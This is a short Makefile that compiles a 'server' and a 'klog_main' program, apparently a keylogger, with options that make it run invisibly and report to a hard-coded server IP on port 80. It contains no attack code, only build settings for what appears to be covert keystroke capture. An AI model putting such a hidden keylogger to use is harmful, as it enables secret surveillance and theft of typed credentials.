SERVER_IP = \"192.168.0.112\"
PORT = 80

# IPV4 / IPv6
IP_VERSION = IPV4

# visible / invisible
Visibility = invisible

CDefine = -D ${IP_VERSION} -D ${Visibility}
CDefine += -D SERVER_IP=${SERVER_IP} -D PORT=${PORT}

CFlags = -lws2_32 -static-libgcc -static-libstdc++ -Wl,-Bstatic -lstdc++ -Wl,-Bdynamic ${CDefine}

all: server klog_main


server: server.cpp
	g++ $< -o $@ $(CFlags)

klog_main: klog_main.cpp
	g++ $< -o $@ $(CFlags)

clean:
	rm -f *.exe
